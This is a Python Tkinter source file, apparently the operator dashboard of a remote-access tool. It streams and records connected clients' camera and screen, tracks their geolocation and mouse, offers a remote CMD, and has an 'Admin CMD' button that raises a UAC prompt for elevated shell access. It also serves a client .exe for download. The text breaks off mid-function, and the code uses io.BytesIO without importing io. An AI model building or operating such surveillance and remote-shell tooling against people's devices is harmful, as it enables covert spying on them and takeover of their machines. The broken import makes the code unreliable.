"""
Interface graphique de contrôle — consomme l'API HTTP du serveur.

Cette GUI ne parle jamais directement aux clients : elle passe toujours
par l'API du serveur.

Ajouts v9 :
  - Second bouton « CMD Admin » (Windows uniquement) qui déclenche chez le
    client le popup UAC natif, puis redirige la sortie du cmd.exe élevé
    vers une seconde fenêtre GUI dédiée.
  - Le bouton est désactivé si l'appareil sélectionné n'est pas sous Windows.
  - Si l'utilisateur du client refuse l'UAC, la fenêtre GUI affiche
    « UAC refusé par l'utilisateur du client ».
"""

import argparse
import json
import os
import platform
import queue
import threading
import time
import tkinter as tk
from tkinter import ttk, filedialog
from dataclasses import dataclass
from pathlib import Path

import cv2
import numpy as np
import requests
from PIL import Image, ImageDraw, ImageFilter, ImageTk

try:
    from tkintermapview import TkinterMapView
    _HAS_MAP = True
except ImportError:
    TkinterMapView = None
    _HAS_MAP = False

DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
POLL_DEVICES_INTERVAL = 2.0
POLL_STATUS_INTERVAL = 1.0
POLL_LOCATION_INTERVAL = 2.0
POLL_MOUSE_INTERVAL = 0.1
DEFAULT_MAP_LAT = -18.8792
DEFAULT_MAP_LON = 47.5079
MAP_TILE_SERVER = "https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}"
MAP_TILE_MAX_ZOOM = 16
POLL_FRAME_INTERVAL = 0.03
FRAME_LONG_POLL_SECONDS = 0.0
REQUEST_TIMEOUT = 5
DOWNLOAD_TIMEOUT = 30
RECORD_FPS_CAMERA = 10
RECORD_FPS_SCREEN = 5
MAX_RECORD_WIDTH = 1920
STALL_WARN_SECONDS = 10.0
BLACK_FRAME_STD = 2.0
LOG_THROTTLE_SECONDS = 5.0
MOUSE_CURSOR_COLOR = "#ff3b30"
MOUSE_CURSOR_RADIUS = 6

SHELL_OUTPUT_POLL_INTERVAL_MS = 300
SHELL_CHAT_POLL_INTERVAL_MS = 800

# --- Thème « Midnight » ---
COLOR_BG = "#0b1020"
COLOR_CARD = "#141b30"
COLOR_CARD_HI = "#1b2440"
COLOR_BORDER = "#263150"
COLOR_VIDEO_BG = "#070a14"
COLOR_TEXT = "#e8ecf8"
COLOR_MUTED = "#8b95b5"
COLOR_ACCENT = "#4f8cff"
COLOR_ACCENT_HI = "#6aa0ff"
COLOR_CAMERA = "#22d3ee"
COLOR_SCREEN = "#a78bfa"
COLOR_OK = "#22c55e"
COLOR_OK_HI = "#34d874"
COLOR_KO = "#ef4444"
COLOR_KO_HI = "#f56565"
COLOR_WARN = "#f59e0b"
COLOR_REC = "#ef4444"
COLOR_DISABLED_BG = "#222b45"
COLOR_DISABLED_FG = "#5d6788"

FONT = "Segoe UI" if platform.system() == "Windows" else "DejaVu Sans"
FONT_MONO = "Consolas" if platform.system() == "Windows" else "DejaVu Sans Mono"
BANNER_HEIGHT = 96
STREAM_ACCENTS = {"camera": COLOR_CAMERA, "screen": COLOR_SCREEN}

FOURCC_CANDIDATES_MP4 = ["mp4v", "avc1", "X264"]
FOURCC_CANDIDATES_AVI = ["XVID", "MJPG"]


def _config_dir() -> Path:
    if platform.system() == "Windows":
        base = Path(os.environ.get("LOCALAPPDATA", Path.home()))
        return base / "CameraGui"
    return Path.home() / ".local" / "share" / "camera-gui"


CONFIG_DIR = _config_dir()
CONFIG_PATH = CONFIG_DIR / "config.json"


def load_config() -> dict:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            pass
    return {}


def save_config(server_url: str) -> None:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    CONFIG_PATH.write_text(json.dumps({"server_url": server_url}, indent=2), encoding="utf-8")


def resolve_server_url(cli_value: str | None) -> str:
    if cli_value:
        return cli_value.rstrip("/")
    config_value = load_config().get("server_url")
    if config_value:
        return config_value.rstrip("/")
    return DEFAULT_SERVER_URL


def _hex_to_rgb(color: str) -> tuple[int, int, int]:
    color = color.lstrip("#")
    return int(color[0:2], 16), int(color[2:4], 16), int(color[4:6], 16)


def _custom_banner_path() -> Path | None:
    for folder in (Path(__file__).resolve().parent, CONFIG_DIR):
        for name in ("banner.png", "banner.jpg", "banner.jpeg"):
            candidate = folder / name
            if candidate.exists():
                return candidate
    return None


def make_banner(width: int, height: int) -> Image.Image:
    width = max(width, 200)
    custom = _custom_banner_path()
    if custom is not None:
        try:
            photo = Image.open(custom).convert("RGB")
            scale = max(width / photo.width, height / photo.height)
            photo = photo.resize((int(photo.width * scale) + 1, int(photo.height * scale) + 1), Image.LANCZOS)
            left, top = (photo.width - width) // 2, (photo.height - height) // 2
            photo = photo.crop((left, top, left + width, top + height))
            veil = Image.new("RGB", (width, height), _hex_to_rgb(COLOR_BG))
            return Image.blend(photo, veil, 0.62)
        except Exception:
            pass

    x = np.linspace(0.0, 1.0, width)[None, :, None]
    y = np.linspace(0.0, 1.0, height)[:, None, None]
    t = np.clip(x * 0.9 + y * 0.1, 0.0, 1.0)
    start = np.array([10, 16, 40], dtype=np.float32)
    end = np.array([58, 50, 168], dtype=np.float32)
    base = (start * (1 - t) + end * t).astype(np.uint8)
    image = Image.fromarray(base, "RGB").convert("RGBA")

    glow = Image.new("RGBA", (width, height), (0, 0, 0, 0))
    draw = ImageDraw.Draw(glow)
    for cx, cy, radius, color in (
        (width - 60, -20, 150, (34, 211, 238, 46)),
        (width - 230, height + 40, 130, (167, 139, 250, 52)),
        (width * 0.55, -70, 110, (79, 140, 255, 34)),
        (width - 420, height // 2, 60, (255, 255, 255, 14)),
    ):
        draw.ellipse((cx - radius, cy - radius, cx + radius, cy + radius), fill=color)
    glow = glow.filter(ImageFilter.GaussianBlur(28))
    image = Image.alpha_composite(image, glow)

    line = ImageDraw.Draw(image)
    line.rectangle((0, height - 2, width, height), fill=(*_hex_to_rgb(COLOR_ACCENT), 120))
    return image.convert("RGB")


def make_logo(size: int = 56) -> Image.Image:
    s = size * 4
    gradient = np.linspace(0.0, 1.0, s)[None, :, None] * 0.5 + np.linspace(0.0, 1.0, s)[:, None, None] * 0.5
    c1 = np.array(_hex_to_rgb(COLOR_ACCENT), dtype=np.float32)
    c2 = np.array(_hex_to_rgb(COLOR_SCREEN), dtype=np.float32)
    fill = Image.fromarray((c1 * (1 - gradient) + c2 * gradient).astype(np.uint8), "RGB").convert("RGBA")
    mask = Image.new("L", (s, s), 0)
    ImageDraw.Draw(mask).rounded_rectangle((0, 0, s - 1, s - 1), radius=int(s * 0.26), fill=255)
    logo = Image.new("RGBA", (s, s), (0, 0, 0, 0))
    logo.paste(fill, (0, 0), mask)
    d = ImageDraw.Draw(logo)
    d.ellipse((s * 0.22, s * 0.22, s * 0.78, s * 0.78), outline=(255, 255, 255, 255), width=int(s * 0.07))
    d.ellipse((s * 0.38, s * 0.38, s * 0.62, s * 0.62), fill=(255, 255, 255, 235))
    return logo.resize((size, size), Image.LANCZOS)


def make_placeholder(kind: str, color_hex: str, size: int = 150) -> Image.Image:
    s = size * 3
    image = Image.new("RGBA", (s, s), (0, 0, 0, 0))
    d = ImageDraw.Draw(image)
    rgb = _hex_to_rgb(color_hex)
    color = (*rgb, 255)
    d.ellipse((s * 0.06, s * 0.06, s * 0.94, s * 0.94), fill=(*rgb, 26))
    d.ellipse((s * 0.14, s * 0.14, s * 0.86, s * 0.86), fill=(*rgb, 22))
    width = max(6, s // 30)
    if kind == "camera":
        d.rounded_rectangle((s * 0.24, s * 0.36, s * 0.76, s * 0.68), radius=s * 0.05, outline=color, width=width)
        d.rounded_rectangle((s * 0.38, s * 0.29, s * 0.52, s * 0.36), radius=s * 0.02, outline=color, width=width)
        d.ellipse((s * 0.40, s * 0.42, s * 0.60, s * 0.62), outline=color, width=width)
    else:
        d.rounded_rectangle((s * 0.22, s * 0.30, s * 0.78, s * 0.62), radius=s * 0.04, outline=color, width=width)
        d.line((s * 0.5, s * 0.62, s * 0.5, s * 0.72), fill=color, width=width)
        d.line((s * 0.38, s * 0.72, s * 0.62, s * 0.72), fill=color, width=width)
    return image.resize((size, size), Image.LANCZOS)


def _open_video_writer(path: str, width: int, height: int, fps: float):
    extension = Path(path).suffix.lower()
    attempts = [(path, FOURCC_CANDIDATES_AVI if extension == ".avi" else FOURCC_CANDIDATES_MP4)]
    if extension != ".avi":
        attempts.append((str(Path(path).with_suffix(".avi")), FOURCC_CANDIDATES_AVI))

    for target, candidates in attempts:
        for codec in candidates:
            writer = cv2.VideoWriter(target, cv2.VideoWriter_fourcc(*codec), fps, (width, height))
            if writer.isOpened():
                return writer, codec, target
            writer.release()
    return None, None, path


@dataclass
class RecordingReport:
    path: str
    codec: str | None
    frames_written: int
    frames_received: int
    duration: float
    max_std: float
    verified_frames: int
    verified_ok: bool


class VideoRecorder:
    def __init__(self, path: str, fps: float, log=print, on_fatal=None):
        self.path = path
        self.fps = float(fps)
        self._log = log
        self._on_fatal = on_fatal
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None
        self._latest: np.ndarray | None = None
        self._last_push = 0.0
        self._size: tuple[int, int] | None = None
        self._writer: cv2.VideoWriter | None = None
        self._codec: str | None = None
        self._started_at: float | None = None
        self.frames_received = 0
        self.frames_written = 0
        self.max_std = 0.0
        self.failed = False

    def push(self, image: np.ndarray) -> None:
        std = float(image[::8, ::8].std())
        with self._lock:
            self._latest = image
            self._last_push = time.monotonic()
            self.frames_received += 1
            self.max_std = max(self.max_std, std)

    def start(self) -> None:
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> RecordingReport:
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=5)
        with self._lock:
            if self._writer is not None:
                self._writer.release()
                self._writer = None
        duration = (time.monotonic() - self._started_at) if self._started_at else 0.0
        verified_frames, verified_ok = self._verify()
        return RecordingReport(
            self.path, self._codec, self.frames_written, self.frames_received,
            duration, self.max_std, verified_frames, verified_ok,
        )

    def _fit_size(self, image: np.ndarray) -> tuple[int, int]:
        height, width = image.shape[:2]
        if width > MAX_RECORD_WIDTH:
            height = int(height * MAX_RECORD_WIDTH / width)
            width = MAX_RECORD_WIDTH
        return max(2, width - width % 2), max(2, height - height % 2)

    def _normalize(self, image: np.ndarray) -> np.ndarray:
        width, height = self._size
        if image.shape[1] != width or image.shape[0] != height:
            image = cv2.resize(image, (width, height), interpolation=cv2.INTER_AREA)
        return image

    def _run(self) -> None:
        interval = 1.0 / self.fps
        next_tick = time.monotonic()
        last_stall_warning = 0.0
        while not self._stop_event.wait(max(0.0, next_tick - time.monotonic())):
            now = time.monotonic()
            with self._lock:
                frame = self._latest
                last_push = self._last_push
            if frame is not None:
                if self._writer is None and not self._open_writer(frame):
                    return
                if self._started_at is None:
                    self._started_at = now
                try:
                    self._writer.write(self._normalize(frame))
                    self.frames_written += 1
                except cv2.error as exc:
                    self._log(f"Erreur d'écriture vidéo : {exc}")
                if now - last_push > STALL_WARN_SECONDS and now - last_stall_warning > STALL_WARN_SECONDS:
                    last_stall_warning = now
                    self._log(
                        f"⚠ Aucune nouvelle image depuis {now - last_push:.0f} s : la dernière image "
                        "est répétée dans la vidéo (flux arrêté ou client déconnecté ?)."
                    )
            next_tick += interval
            if now - next_tick > 1.0:
                next_tick = now + interval

    def _open_writer(self, first_frame: np.ndarray) -> bool:
        self._size = self._fit_size(first_frame)
        writer, codec, final_path = _open_video_writer(self.path, *self._size, self.fps)
        if writer is None:
            self.failed = True
            self._log(
                f"❌ Impossible d'ouvrir {self.path} pour l'écriture vidéo (aucun codec disponible). "
                "Installez les codecs FFmpeg/GStreamer ou choisissez une extension .avi."
            )
            if self._on_fatal:
                self._on_fatal()
            return False
        if final_path != self.path:
            self._log(f"⚠ Codec MP4 indisponible : enregistrement redirigé vers {final_path}")
            self.path = final_path
        self._writer, self._codec = writer, codec
        self._log(f"Codec vidéo utilisé : {codec} — {self._size[0]}x{self._size[1]} à {self.fps:g} im/s")
        return True

    def _verify(self) -> tuple[int, bool]:
        if self.frames_written == 0 or not Path(self.path).exists():
            return 0, False
        capture = cv2.VideoCapture(self.path)
        try:
            if not capture.isOpened():
                return 0, False
            count = int(capture.get(cv2.CAP_PROP_FRAME_COUNT))
            ok, _ = capture.read()
            return count, bool(ok and count > 0)
        finally:
            capture.release()


class StreamPanel:
    def __init__(self, key: str, title: str):
        self.key = key
        self.title = title
        self.on = False
        self.recording = False
        self.recorder: VideoRecorder | None = None
        self.last_jpeg: bytes | None = None
        self.view_size: tuple[int, int] = (420, 380)
        self.pending_image = None
        self.display_scheduled = False
        self.display_lock = threading.Lock()
        self.video_label: tk.Label | None = None
        self.title_var: tk.StringVar | None = None
        self.status_var: tk.StringVar | None = None
        self.btn_start: ttk.Button | None = None
        self.btn_stop: ttk.Button | None = None
        self.btn_record: ttk.Button | None = None
        self.rec_badge: tk.Label | None = None
        self.status_label: tk.Label | None = None
        self.placeholder = None


class CameraServerApp:
    def __init__(self, root: tk.Tk, server_url: str = DEFAULT_SERVER_URL):
        self.root = root
        self.server_url = server_url.rstrip("/")
        self.root.title("Contrôle caméra / écran — Dashboard")
        screen_w, screen_h = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        win_w, win_h = min(1440, screen_w - 60), min(860, screen_h - 90)
        self.root.geometry(f"{win_w}x{win_h}+{max((screen_w - win_w) // 2, 0)}+{max((screen_h - win_h) // 3, 0)}")
        self.root.minsize(min(1040, win_w), min(660, win_h))
        self.root.configure(bg=COLOR_BG)

        self.camera_on = False
        self.screen_on = False
        self.devices: dict[str, dict] = {}
        self.selected_device_id: str | None = None
        self.log_queue: "queue.Queue" = queue.Queue()
        self._throttle_times: dict[str, float] = {}

        self.location_open = False
        self.last_location: dict | None = None
        self._location_marker = None

        self.mouse_position: dict | None = None

        self.panels: dict[str, StreamPanel] = {
            "camera": StreamPanel("camera", "📷  Caméra"),
            "screen": StreamPanel("screen", "🖥  Écran"),
        }

        self._cmd_windows: dict[str, tk.Toplevel] = {}
        self._chat_windows: dict[str, tk.Toplevel] = {}
        self._admin_cmd_windows: dict[str, tk.Toplevel] = {}

        self._build_ui()
        self._poll_logs()
        self._log(f"Serveur configuré : {self.server_url}")

        threading.Thread(target=self._poll_devices_loop, daemon=True).start()
        threading.Thread(target=self._poll_status_loop, daemon=True).start()
        threading.Thread(target=self._poll_location_loop, daemon=True).start()
        threading.Thread(target=self._poll_mouse_loop, daemon=True).start()
        for key in self.panels:
            threading.Thread(target=self._poll_frame_loop, args=(key,), daemon=True).start()

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    # ------------------------------------------------------------------
    # UI
    # ------------------------------------------------------------------
    def _apply_theme(self) -> None:
        style = ttk.Style(self.root)
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass
        style.configure("TButton", background=COLOR_CARD, foreground=COLOR_TEXT,
                        borderwidth=1, focusthickness=0, padding=(10, 6), font=(FONT, 9))
        style.map("TButton", background=[("active", COLOR_CARD_HI), ("disabled", COLOR_DISABLED_BG)],
                  foreground=[("disabled", COLOR_DISABLED_FG)])
        style.configure("Primary.TButton", background=COLOR_ACCENT, foreground="#ffffff",
                        font=(FONT, 9, "bold"))
        style.map("Primary.TButton", background=[("active", COLOR_ACCENT_HI), ("disabled", COLOR_DISABLED_BG)])
        style.configure("TCombobox", fieldbackground=COLOR_CARD, background=COLOR_CARD,
                        foreground=COLOR_TEXT, arrowcolor=COLOR_TEXT, padding=(6, 4))
        style.configure("Dark.TCombobox", fieldbackground=COLOR_CARD, background=COLOR_CARD,
                        foreground=COLOR_TEXT)

    def _build_ui(self) -> None:
        self._apply_theme()

        self._logo_photo = ImageTk.PhotoImage(make_logo(34))
        try:
            self.root.iconphoto(True, self._logo_photo)
        except tk.TclError:
            pass

        # En-tête
        header = tk.Frame(self.root, bg=COLOR_CARD)
        header.pack(fill="x")
        tk.Frame(header, bg=COLOR_ACCENT, height=2).pack(fill="x")
        header_in = tk.Frame(header, bg=COLOR_CARD)
        header_in.pack(fill="x", padx=16, pady=9)
        tk.Label(header_in, image=self._logo_photo, bg=COLOR_CARD).pack(side="left")
        titles = tk.Frame(header_in, bg=COLOR_CARD)
        titles.pack(side="left", padx=(12, 0))
        tk.Label(titles, text="Contrôle caméra / écran", bg=COLOR_CARD, fg=COLOR_TEXT,
                 font=(FONT, 13, "bold")).pack(anchor="w")
        tk.Label(titles, text="Tableau de bord à distance  ·  multi-appareils  ·  temps réel",
                 bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8)).pack(anchor="w")

        self.btn_download = ttk.Button(header_in, text="⬇  Télécharger le client (.exe)",
                                       command=self.download_client_installer,
                                       style="Primary.TButton", cursor="hand2")
        self.btn_download.pack(side="right")
        self.status_var = tk.StringVar(value="● Connexion au serveur...")
        status_pill = tk.Frame(header_in, bg=COLOR_BG, highlightthickness=1,
                               highlightbackground=COLOR_BORDER)
        status_pill.pack(side="right", padx=(0, 14))
        self.status_label = tk.Label(status_pill, textvariable=self.status_var, bg=COLOR_BG,
                                     fg=COLOR_KO, font=(FONT, 9, "bold"), padx=14, pady=5)
        self.status_label.pack()
        tk.Frame(header, bg=COLOR_BORDER, height=1).pack(fill="x")

        # Barre appareil
        toolbar = tk.Frame(self.root, bg=COLOR_BG)
        toolbar.pack(fill="x", padx=14, pady=(10, 8))
        tk.Label(toolbar, text=f"Serveur  ·  {self.server_url}", bg=COLOR_BG,
                 fg=COLOR_MUTED, font=(FONT, 9)).pack(side="right", padx=(14, 0))
        tk.Label(toolbar, text="APPAREIL", bg=COLOR_BG, fg=COLOR_MUTED,
                 font=(FONT, 9, "bold")).pack(side="left", padx=(0, 10))
        self.device_var = tk.StringVar()
        self.device_combo = ttk.Combobox(toolbar, textvariable=self.device_var,
                                          state="readonly", width=45,
                                          style="Dark.TCombobox", font=(FONT, 10))
        self.device_combo.pack(side="left", fill="x", expand=True, ipady=2)
        self.device_combo.bind("<<ComboboxSelected>>", self._on_device_selected)

        # Barre outils distants
        shell_toolbar = tk.Frame(self.root, bg=COLOR_BG)
        shell_toolbar.pack(fill="x", padx=14, pady=(0, 8))
        tk.Label(shell_toolbar, text="OUTILS DISTANTS", bg=COLOR_BG, fg=COLOR_MUTED,
                 font=(FONT, 9, "bold")).pack(side="left", padx=(0, 10))
        self.btn_open_cmd = ttk.Button(shell_toolbar, text="⌨  CMD distant",
                                       style="Primary.TButton", cursor="hand2",
                                       command=self._open_cmd_window_for_selected)
        self.btn_open_cmd.pack(side="left", padx=(0, 8))
        self.btn_open_admin_cmd = ttk.Button(shell_toolbar, text="🛡  CMD Admin",
                                              style="Primary.TButton", cursor="hand2",
                                              command=self._open_admin_cmd_window_for_selected)
        self.btn_open_admin_cmd.pack(side="left", padx=(0, 8))
        self.btn_open_chat = ttk.Button(shell_toolbar, text="💬  Chat distant",
                                        style="Primary.TButton", cursor="hand2",
                                        command=self._open_chat_window_for_selected)
        self.btn_open_chat.pack(side="left")

        # Zone principale : flux caméra + écran à gauche, log + carte à droite
        sash = dict(bg=COLOR_BG, sashwidth=8, sashrelief="flat", borderwidth=0, sashpad=0,
                    opaqueresize=True)
        main = tk.PanedWindow(self.root, orient="horizontal", **sash)
        main.pack(fill="both", expand=True, padx=14, pady=(0, 14))

        left = tk.PanedWindow(main, orient="vertical", **sash)
        main.add(left, minsize=620, stretch="always")

        streams_frame = tk.Frame(left, bg=COLOR_BG)
        streams_frame.columnconfigure(0, weight=1, uniform="panel")
        streams_frame.columnconfigure(1, weight=1, uniform="panel")
        streams_frame.rowconfigure(0, weight=1)
        self._build_stream_panel(streams_frame, self.panels["camera"], column=0)
        self._build_stream_panel(streams_frame, self.panels["screen"], column=1)
        left.add(streams_frame, minsize=280, stretch="always")

        log_card = self._build_log_panel(left)
        left.add(log_card, minsize=90, height=170, stretch="never")

        location_card = self._build_location_panel(main)
        main.add(location_card, minsize=300, width=420, stretch="never")

    def _build_log_panel(self, parent: tk.Misc) -> tk.Frame:
        log_card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
                            highlightbackground=COLOR_BORDER)
        header = tk.Frame(log_card, bg=COLOR_CARD)
        header.pack(fill="x", padx=10, pady=(8, 4))
        tk.Label(header, text="📋  Journal", bg=COLOR_CARD, fg=COLOR_TEXT,
                 font=(FONT, 10, "bold")).pack(side="left")
        self.log_text = tk.Text(log_card, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT,
                                 font=(FONT_MONO, 8), height=6, wrap="word",
                                 state="disabled", borderwidth=0, highlightthickness=0)
        self.log_text.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        return log_card

    def _build_location_panel(self, parent: tk.Misc) -> tk.Frame:
        card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
                        highlightbackground=COLOR_BORDER)
        header = tk.Frame(card, bg=COLOR_CARD)
        header.pack(fill="x", padx=12, pady=(10, 6))
        tk.Label(header, text="🌍  Localisation", bg=COLOR_CARD, fg=COLOR_TEXT,
                 font=(FONT, 11, "bold")).pack(side="left")
        self.btn_location = ttk.Button(header, text="Ouvrir",
                                        style="Primary.TButton",
                                        command=self._toggle_location)
        self.btn_location.pack(side="right")

        self.location_status = tk.Label(card, text="Aucune donnée de position",
                                        bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 9))
        self.location_status.pack(anchor="w", padx=12, pady=(0, 6))

        map_frame = tk.Frame(card, bg=COLOR_VIDEO_BG)
        map_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        self.map_view = None
        if _HAS_MAP:
            try:
                self.map_view = TkinterMapView(map_frame, corner_radius=0)
                self.map_view.pack(fill="both", expand=True)
                self.map_view.set_position(DEFAULT_MAP_LAT, DEFAULT_MAP_LON)
                self.map_view.set_zoom(4)
                try:
                    self.map_view.set_tile_server(MAP_TILE_SERVER, max_zoom=MAP_TILE_MAX_ZOOM)
                except Exception:
                    pass
            except Exception as exc:
                self._log(f"Carte indisponible : {exc}")
                self.map_view = None
        if self.map_view is None:
            tk.Label(map_frame, text="(module tkintermapview non installé)",
                     bg=COLOR_VIDEO_BG, fg=COLOR_MUTED, font=(FONT, 9)).pack(expand=True)
        return card

    def _build_stream_panel(self, parent: tk.Misc, panel: StreamPanel, column: int) -> None:
        accent = STREAM_ACCENTS[panel.key]
        card = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1,
                        highlightbackground=COLOR_BORDER)
        card.grid(row=0, column=column, sticky="nsew", padx=6, pady=6)

        header = tk.Frame(card, bg=COLOR_CARD)
        header.pack(fill="x", padx=10, pady=(8, 6))
        tk.Label(header, text=panel.title, bg=COLOR_CARD, fg=accent,
                 font=(FONT, 11, "bold")).pack(side="left")
        panel.status_var = tk.StringVar(value="Arrêté")
        panel.status_label = tk.Label(header, textvariable=panel.status_var,
                                      bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8))
        panel.status_label.pack(side="right")

        video_bg = tk.Frame(card, bg=COLOR_VIDEO_BG, height=380)
        video_bg.pack(fill="both", expand=True, padx=10)
        video_bg.pack_propagate(False)
        panel.video_label = tk.Label(video_bg, bg=COLOR_VIDEO_BG, text="", cursor="crosshair")
        panel.video_label.pack(fill="both", expand=True)
        panel.placeholder = ImageTk.PhotoImage(
            make_placeholder(panel.key, accent.replace("#", ""), 140))
        panel.video_label.configure(image=panel.placeholder)
        panel.video_label.bind("<Button-1>", lambda e, k=panel.key: self._on_video_click(k, e))

        ctrl = tk.Frame(card, bg=COLOR_CARD)
        ctrl.pack(fill="x", padx=10, pady=8)
        panel.btn_start = ttk.Button(ctrl, text="▶  Démarrer", style="Primary.TButton",
                                     command=lambda k=panel.key: self._set_stream(k, "START"))
        panel.btn_start.pack(side="left", padx=(0, 6))
        panel.btn_stop = ttk.Button(ctrl, text="■  Arrêter",
                                     command=lambda k=panel.key: self._set_stream(k, "STOP"))
        panel.btn_stop.pack(side="left", padx=(0, 6))
        panel.btn_record = ttk.Button(ctrl, text="●  Enregistrer",
                                       command=lambda k=panel.key: self._toggle_record(k))
        panel.btn_record.pack(side="left")
        panel.rec_badge = tk.Label(ctrl, text="", bg=COLOR_CARD, fg=COLOR_REC,
                                    font=(FONT, 9, "bold"))
        panel.rec_badge.pack(side="right")

    # ------------------------------------------------------------------
    # Logs
    # ------------------------------------------------------------------
    def _log(self, message: str, throttle_key: str | None = None) -> None:
        now = time.monotonic()
        if throttle_key is not None:
            last = self._throttle_times.get(throttle_key)
            if last is not None and now - last < LOG_THROTTLE_SECONDS:
                return
            self._throttle_times[throttle_key] = now
        self.log_queue.put(f"[{time.strftime('%H:%M:%S')}] {message}")

    def _poll_logs(self) -> None:
        try:
            while True:
                line = self.log_queue.get_nowait()
                self.log_text.configure(state="normal")
                self.log_text.insert(tk.END, line + "\n")
                self.log_text.see(tk.END)
                self.log_text.configure(state="disabled")
        except queue.Empty:
            pass
        self.root.after(200, self._poll_logs)

    # ------------------------------------------------------------------
    # Appareil
    # ------------------------------------------------------------------
    def _poll_devices_loop(self) -> None:
        while True:
            try:
                r = requests.get(f"{self.server_url}/api/devices", timeout=REQUEST_TIMEOUT)
                if r.status_code == 200:
                    self.root.after(0, self._refresh_device_combo, r.json().get("devices", []))
                    if r.json().get("devices"):
                        self.root.after(0, lambda: self.status_var.set("● Connecté au serveur"))
                        self.root.after(0, lambda: self.status_label.configure(fg=COLOR_OK))
            except requests.RequestException:
                self.root.after(0, lambda: self.status_var.set("● Serveur injoignable"))
                self.root.after(0, lambda: self.status_label.configure(fg=COLOR_KO))
            time.sleep(POLL_DEVICES_INTERVAL)

    def _refresh_device_combo(self, devices: list) -> None:
        current = self.device_var.get()
        self.devices = {d["device_id"]: d for d in devices}
        values = [
            f"{d['name']} — {d['device_id'][:8]}"
            + ("  ●" if d.get("connected") else "  ○")
            for d in devices
        ]
        self.device_combo["values"] = values
        if current not in values and values:
            self.device_combo.current(0)
            self._on_device_selected()
        elif current in values:
            for d in devices:
                if current.startswith(d["name"]):
                    self.selected_device_id = d["device_id"]
                    break

    def _on_device_selected(self, _evt=None) -> None:
        sel = self.device_var.get()
        for d in self.devices.values():
            if sel.startswith(d["name"]):
                self.selected_device_id = d["device_id"]
                break
        info = self.devices.get(self.selected_device_id or "")
        if info is not None and info.get("platform") != "windows":
            self.btn_open_admin_cmd.state(["disabled"])
        else:
            self.btn_open_admin_cmd.state(["!disabled"])

    def _poll_status_loop(self) -> None:
        while True:
            device_id = self.selected_device_id
            if device_id:
                try:
                    r = requests.get(f"{self.server_url}/api/status",
                                     params={"device_id": device_id},
                                     timeout=REQUEST_TIMEOUT)
                    if r.status_code == 200:
                        data = r.json()
                        self.root.after(0, lambda d=data: self._apply_status(d))
                except requests.RequestException:
                    pass
            time.sleep(POLL_STATUS_INTERVAL)

    def _apply_status(self, data: dict) -> None:
        info = self.devices.get(self.selected_device_id or "")
        if info is not None and data.get("platform") != "windows":
            self.btn_open_admin_cmd.state(["disabled"])
        else:
            self.btn_open_admin_cmd.state(["!disabled"])

    def _poll_location_loop(self) -> None:
        while True:
            device_id = self.selected_device_id
            if device_id:
                try:
                    r = requests.get(f"{self.server_url}/api/location/latest",
                                     params={"device_id": device_id},
                                     timeout=REQUEST_TIMEOUT)
                    if r.status_code == 200:
                        data = r.json()
                        self.root.after(0, lambda d=data: self._apply_location(d))
                except requests.RequestException:
                    pass
            time.sleep(POLL_LOCATION_INTERVAL)

    def _apply_location(self, data: dict) -> None:
        self.location_open = bool(data.get("browser_open"))
        self.btn_location.configure(text="Fermer" if self.location_open else "Ouvrir")
        latest = data.get("latest")
        if latest:
            self.location_status.configure(
                text=f"{latest['lat']:.5f}, {latest['lon']:.5f}  ± {latest.get('accuracy', '?')} m"
            )
            if self.map_view is not None:
                try:
                    if self._location_marker is None:
                        self._location_marker = self.map_view.set_marker(
                            latest["lat"], latest["lon"], text="Client")
                    else:
                        self._location_marker.set_position(latest["lat"], latest["lon"])
                    self.map_view.set_position(latest["lat"], latest["lon"])
                    if self.map_view.zoom < 12:
                        self.map_view.set_zoom(14)
                except Exception:
                    pass

    def _toggle_location(self) -> None:
        device_id = self.selected_device_id
        if not device_id:
            return
        command = "CLOSE" if self.location_open else "OPEN"
        try:
            requests.post(f"{self.server_url}/api/location/command",
                          json={"device_id": device_id, "command": command},
                          timeout=REQUEST_TIMEOUT)
        except requests.RequestException as exc:
            self._log(f"Localisation : {exc}")

    # ------------------------------------------------------------------
    # Flux vidéo
    # ------------------------------------------------------------------
    def _poll_frame_loop(self, key: str) -> None:
        after_seq = None
        while True:
            device_id = self.selected_device_id
            if not device_id:
                time.sleep(POLL_FRAME_INTERVAL)
                continue
            try:
                params = {"device_id": device_id, "stream": key}
                if after_seq is not None:
                    params["after"] = after_seq
                if FRAME_LONG_POLL_SECONDS > 0:
                    params["wait"] = FRAME_LONG_POLL_SECONDS
                r = requests.get(f"{self.server_url}/api/frame/latest",
                                  params=params, timeout=REQUEST_TIMEOUT)
                if r.status_code == 200 and r.content:
                    seq = r.headers.get("X-Frame-Seq")
                    if seq is not None:
                        after_seq = int(seq)
                    jpeg = r.content
                    self.root.after(0, lambda k=key, j=jpeg: self._apply_frame(k, j))
                elif r.status_code == 204:
                    pass
            except requests.RequestException:
                pass
            time.sleep(POLL_FRAME_INTERVAL)

    def _apply_frame(self, key: str, jpeg: bytes) -> None:
        panel = self.panels[key]
        panel.last_jpeg = jpeg
        if panel.recording and panel.recorder is not None:
            try:
                arr = cv2.imdecode(np.frombuffer(jpeg, dtype=np.uint8), cv2.IMREAD_COLOR)
                if arr is not None:
                    panel.recorder.push(arr)
            except Exception:
                pass
        try:
            image = Image.open(io.BytesIO(jpeg)).convert("RGB")
        except Exception:
            return
